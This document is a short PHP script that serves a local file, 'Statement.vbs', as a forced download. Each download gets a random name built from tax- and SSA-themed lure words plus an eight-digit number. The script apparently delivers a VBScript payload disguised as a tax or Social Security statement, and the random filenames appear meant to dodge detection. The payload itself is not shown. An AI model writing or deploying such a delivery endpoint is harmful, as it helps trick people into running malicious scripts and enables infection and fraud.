<?php
$file = __DIR__ . '/Statement.vbs';

if (!file_exists($file)) {
    http_response_code(404);
    exit;
}

$names = ['TAX', 'TAX-client', 'Statement', 'client-TAX', 'SSA'];
$randomName = $names[array_rand($names)] . '_' . rand(10000000,99999999) . '.vbs';


header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $randomName . '"');
header('Content-Length: ' . filesize($file));
header('Cache-Control: no-cache, must-revalidate');
header('Pragma: public');

readfile($file);
exit;
